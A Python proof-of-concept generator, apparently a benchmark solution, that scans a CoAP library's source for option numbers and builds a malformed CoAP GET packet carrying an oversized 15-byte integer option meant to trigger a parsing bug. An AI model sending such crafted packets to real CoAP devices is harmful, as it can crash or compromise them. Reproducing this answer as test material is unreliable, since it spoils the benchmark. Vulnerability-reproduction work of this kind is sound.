import os
import re
import tarfile
from typing import Iterator, Tuple, Optional


class Solution:
    def _iter_source_texts(self, src_path: str) -> Iterator[Tuple[str, str]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if st.st_size <= 0 or st.st_size > 2_000_000:
                        continue
                    try:
                        with open(p, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    yield p, data.decode("latin1", errors="ignore")
            return

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        if m.size <= 0 or m.size > 2_000_000:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        yield m.name, data.decode("latin1", errors="ignore")
            except Exception:
                return

    def _choose_uint_option_number(self, src_path: str) -> int:
        preferred_small = [12, 7, 6]  # Content-Format, Uri-Port, Observe
        found = set()

        define_re = re.compile(
            r'^\s*#\s*define\s+[A-Za-z_][A-Za-z0-9_]*OPTION[A-Za-z0-9_]*\s+(\d+)\b',
            re.MULTILINE,
        )
        enum_re = re.compile(
            r'\b[A-Za-z_][A-Za-z0-9_]*OPTION[A-Za-z0-9_]*\s*=\s*(\d+)\b'
        )

        for _, text in self._iter_source_texts(src_path):
            for m in define_re.finditer(text):
                try:
                    found.add(int(m.group(1)))
                except Exception:
                    pass
            for m in enum_re.finditer(text):
                try:
                    found.add(int(m.group(1)))
                except Exception:
                    pass
            if any(n in found for n in preferred_small):
                break

        for n in preferred_small:
            if n in found:
                return n
        return 12

    def solve(self, src_path: str) -> bytes:
        opt_num = self._choose_uint_option_number(src_path)

        # CoAP header: Ver=1, Type=CON(0), TKL=1
        b0 = 0x40 | 0x01
        code = 0x01  # GET
        mid_hi = 0x00
        mid_lo = 0x00
        token = b"\x00"

        # First option delta = opt_num, length = 15 (max nibble, no ext)
        # Ensure opt_num <= 12 to keep single-byte delta; if not, fall back to 12.
        if opt_num > 12:
            opt_num = 12
        opt_hdr = bytes([(opt_num << 4) | 0x0F])

        # 15-byte integer value with MSB non-zero (minimal encoding for a large integer)
        opt_val = b"\x01" + (b"\x00" * 14)

        return bytes([b0, code, mid_hi, mid_lo]) + token + opt_hdr + opt_val